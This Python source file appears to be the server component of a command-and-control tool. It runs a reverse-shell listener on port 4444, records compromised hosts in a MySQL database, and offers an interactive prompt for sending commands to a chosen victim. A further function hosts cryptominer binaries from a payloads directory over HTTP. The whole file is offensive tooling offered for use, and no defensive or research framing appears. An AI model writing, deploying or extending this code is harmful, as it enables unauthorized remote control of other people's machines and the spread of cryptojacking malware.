import socket
import threading
import os
import mysql.connector
from modules.config_handler import load_config

# Load database configuration from the config file
db_config = load_config().get("db_config", {
    "host": "localhost",
    "user": "root",
    "password": "password",
    "database": "c2_database",
})

# Global list to maintain connected clients and listener threads
connected_clients = []
listener_threads = []
listener_sockets = []

# Database connection
def get_db_connection():
    try:
        conn = mysql.connector.connect(**db_config)
        return conn
    except mysql.connector.Error as err:
        print(f"[ERROR] MySQL Connection Error: {err}")
        return None

# Save host to database
def save_host_to_db(ip, port):
    conn = get_db_connection()
    if not conn:
        return

    cursor = conn.cursor()
    try:
        cursor.execute(
            "INSERT INTO hosts (ip_address, port) VALUES (%s, %s)",
            (ip, port),
        )
        conn.commit()
        print(f"[INFO] Saved host {ip}:{port} to database.")
    except mysql.connector.Error as err:
        print(f"[ERROR] Failed to save host to database: {err}")
    finally:
        cursor.close()
        conn.close()

# Fetch all hosts from database
def fetch_hosts_from_db():
    conn = get_db_connection()
    if not conn:
        return []

    cursor = conn.cursor(dictionary=True)
    try:
        cursor.execute("SELECT * FROM hosts")
        return cursor.fetchall()
    except mysql.connector.Error as err:
        print(f"[ERROR] Failed to fetch hosts: {err}")
        return []
    finally:
        cursor.close()
        conn.close()

# Listener setup
def start_listener(host="0.0.0.0", port=4444):
    """
    Start the listener for incoming reverse shell connections.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    listener_sockets.append(server)

    print(f"[INFO] Listener started on {host}:{port}")

    def accept_connections():
        while True:
            try:
                client_socket, client_address = server.accept()
                print(f"[INFO] Connection established with {client_address}")
                connected_clients.append((client_socket, client_address))
                save_host_to_db(client_address[0], client_address[1])
                threading.Thread(target=handle_client, args=(client_socket, client_address)).start()
            except OSError:
                print(f"[INFO] Listener on {host}:{port} has been stopped.")
                break

    thread = threading.Thread(target=accept_connections, daemon=True)
    listener_threads.append(thread)
    thread.start()

# Stop listeners
def stop_listeners():
    """
    Stop all active listeners.
    """
    for server_socket in listener_sockets:
        try:
            server_socket.close()
            print("[INFO] Listener socket closed.")
        except Exception as e:
            print(f"[ERROR] Failed to close listener: {e}")

    for thread in listener_threads:
        if thread.is_alive():
            print("[INFO] Stopping listener thread.")
            thread.join(timeout=1)

    listener_sockets.clear()
    listener_threads.clear()
    print("[INFO] All listeners have been stopped.")

# Handle client communication
def handle_client(client_socket, client_address):
    """
    Handle communication with a connected reverse shell client.
    """
    try:
        while True:
            command = client_socket.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                print(f"[INFO] Connection with {client_address} closed.")
                connected_clients.remove((client_socket, client_address))
                client_socket.close()
                break

            output = execute_command(command)
            client_socket.send(output.encode("utf-8"))
    except Exception as e:
        print(f"[ERROR] Connection with {client_address} lost: {e}")
        connected_clients.remove((client_socket, client_address))
        client_socket.close()

# Execute commands
def execute_command(command):
    """
    Execute a command on the connected client and return the result.

    :param command: Command to execute.
    :return: Output of the command.
    """
    try:
        return os.popen(command).read()
    except Exception as e:
        return f"[ERROR] Failed to execute command: {e}"

# Command-and-Control interface
def c2_interface():
    """
    Interactive interface for managing connected clients and issuing commands.
    """
    while True:
        print("\n[ Command and Control ]")
        print("Connected Clients:")

        for idx, (_, client_address) in enumerate(connected_clients, 1):
            print(f"{idx}.) {client_address}")

        db_hosts = fetch_hosts_from_db()
        print("\n[ Hosts in Database ]")
        for host in db_hosts:
            print(f"ID: {host['id']}, IP: {host['ip_address']}, Port: {host['port']}")

        if not connected_clients and not db_hosts:
            print("[INFO] No connected clients or database hosts.")
            break

        try:
            choice = int(input("Select a connected client by number (or 0 to exit): "))
            if choice == 0:
                break
            client_socket, client_address = connected_clients[choice - 1]
            print(f"[INFO] Selected client: {client_address}")

            while True:
                command = input(f"C2@{client_address}> ")
                if command.lower() == "exit":
                    print("[INFO] Returning to main menu.")
                    break
                client_socket.send(command.encode("utf-8"))
                response = client_socket.recv(4096).decode("utf-8")
                print(response)
        except (IndexError, ValueError):
            print("[ERROR] Invalid selection. Try again.")

# Start hosting cryptominer binaries
def start_apache_server(directory="payloads/cryptominers", port=80):
    """
    Start an Apache server to host cryptominer binaries.
    """
    print(f"[INFO] Hosting cryptominer binaries from {directory} on port {port}.")
    os.system(f"python3 -m http.server {port} --directory {directory}")
